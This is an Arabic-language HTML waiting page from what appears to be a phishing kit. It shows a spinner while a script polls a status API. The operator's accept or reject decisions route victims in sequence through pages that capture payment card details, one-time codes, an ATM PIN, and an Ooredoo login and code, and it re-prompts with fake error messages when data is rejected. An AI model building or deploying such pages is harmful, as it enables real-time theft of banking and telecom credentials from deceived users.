<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>جاري المراجعة</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #f5f7fb;
      font-family: Arial, sans-serif;
    }
    .box {
      background: transparent;
      border-radius: 18px;
      width: min(92vw, 480px);
      box-shadow: none;
      padding: 0;
      text-align: center;
    }
    .spinner {
      width: 56px;
      height: 56px;
      margin: 0 auto;
      border: 5px solid rgba(25, 118, 210, 0.2);
      border-top-color: #1976D2;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="box">
    <div class="spinner"></div>
  </div>

  <script>
    (function(){
      var params = new URLSearchParams(window.location.search);
      var requestId = params.get('id');
      var type = params.get('type') || 'otp';
      if (!requestId) {
        window.location.href = 'index.html';
        return;
      }

      var interval = setInterval(function(){
        fetch('/api/status/' + requestId)
          .then(function(res){ return res.json(); })
          .then(function(data){
            if (!data || !data.status) return;
            var status = String(data.status).trim().toLowerCase();

            if (status === 'payment_accepted') {
              clearInterval(interval);
              window.location.href = 'otp.html?id=' + requestId;
            } else if (status === 'payment_rejected') {
              clearInterval(interval);
              var msg = 'تم رفض بيانات الدفع. يرجى التحقق والمحاولة مرة أخرى.';
              window.location.href = 'payment_ar.html?error=payment&msg=' + encodeURIComponent(msg) + '&id=' + requestId;
            } else if (status === 'otp_accepted') {
              clearInterval(interval);
              window.location.href = 'atm.html?id=' + requestId;
            } else if (status === 'otp_rejected') {
              clearInterval(interval);
              var otpMsg = 'تم رفض رمز التحقق. يرجى التحقق من الرمز والمحاولة مرة أخرى.';
              window.location.href = 'otp.html?error=otp&msg=' + encodeURIComponent(otpMsg) + '&id=' + requestId;
            } else if (status === 'atm_accepted') {
              clearInterval(interval);
              window.location.href = 'ooredoo-login.html?id=' + requestId;
            } else if (status === 'atm_rejected') {
              clearInterval(interval);
              var atmMsg = 'تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.';
              window.location.href = 'atm.html?error=atm&msg=' + encodeURIComponent(atmMsg) + '&id=' + requestId;
            } else if (status === 'ooredoo_login_accepted') {
              clearInterval(interval);
              window.location.href = 'ooredoo-otp.html?id=' + requestId;
            } else if (status === 'ooredoo_login_rejected') {
              clearInterval(interval);
              var ooredooMsg = 'تم رفض بيانات أوريدو. يرجى التحقق والمحاولة مرة أخرى.';
              window.location.href = 'ooredoo-login.html?error=ooredoo&msg=' + encodeURIComponent(ooredooMsg) + '&id=' + requestId;
            } else if (status === 'ooredoo_otp_accepted') {
              clearInterval(interval);
              window.location.href = 'ooredoo-success.html?id=' + requestId;
            } else if (status === 'ooredoo_otp_rejected') {
              clearInterval(interval);
              var ooredooOtpMsg = 'تم رفض رمز أوريدو. يرجى التحقق والمحاولة مرة أخرى.';
              window.location.href = 'ooredoo-otp.html?error=ooredoo_otp&msg=' + encodeURIComponent(ooredooOtpMsg) + '&id=' + requestId;
            }
          })
          .catch(function(){});
      }, 2000);
    })();
  </script>
<script src="heartbeat.js"></script>
</body>
</html>
